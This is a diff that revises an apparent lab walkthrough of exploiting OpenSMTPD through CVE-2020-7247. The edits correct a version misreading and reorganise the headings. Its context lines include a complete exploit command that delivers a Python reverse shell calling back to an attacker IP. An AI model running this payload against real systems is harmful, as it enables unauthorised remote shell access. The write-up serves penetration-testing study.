@@ -22,7 +22,7 @@ categories:
 
 ---
 
-## Recon
+## Enumeration
 
 ### Nmap
 
@@ -42,10 +42,6 @@ PORT    STATE  SERVICE     VERSION
 445/tcp open   netbios-ssn Samba smbd 4.7.6-Ubuntu
 ```
 {{< /collapse >}}
-
----
-
-## Enumeration
 
 ### Port 80 - Web App (FlaskBB)
 
@@ -67,7 +63,7 @@ Downloaded `passwd.bak` -- it's just a copy of `/etc/passwd`. Another rabbit hol
 ### Port 25 - SMTP
 
 {{< callout type="flag" >}}
-This is the attack vector. **OpenSMTPD 2.0.0** is ancient and has known RCE vulnerabilities.
+This is the attack vector. That leading `2.0.0` is an SMTP status-code prefix, not the OpenSMTPD version -- but OpenSMTPD is exactly what we want. CVE-2020-7247 (MAIL FROM RCE) affects versions before 6.6.2, and this build is vulnerable.
 {{< /callout >}}
 
 ```bash
@@ -95,7 +91,7 @@ Confirmed via tcpdump. Now for a shell -- the tricky part. The exploit doesn't h
 Most reverse shell one-liners won't work here because the exploit chokes on special characters. Python's `subprocess` module with escaped quotes is the way to go.
 {{< /callout >}}
 
-The working payload -- escape all commas in the Python reverse shell:
+The working payload -- escape the double-quotes in the Python reverse shell:
 
 ```bash
 python3 ./47984.py 192.168.206.71 25 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.206\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"'
@@ -125,5 +121,5 @@ proof.txt: [redacted]
 {{< callout type="note" >}}
 - Enumerate **all** service versions thoroughly -- the web app and SMB were rabbit holes, SMTP was the way in
 - When exploit payloads break due to character escaping, try Python's `subprocess` module with carefully escaped quotes
-- OpenSMTPD 2.0.0 is critically vulnerable -- always check for known CVEs on outdated services
+- OpenSMTPD before 6.6.2 is critically vulnerable to CVE-2020-7247 -- and don't mistake the banner's `2.0.0` status-code prefix for the software version
 {{< /callout >}}
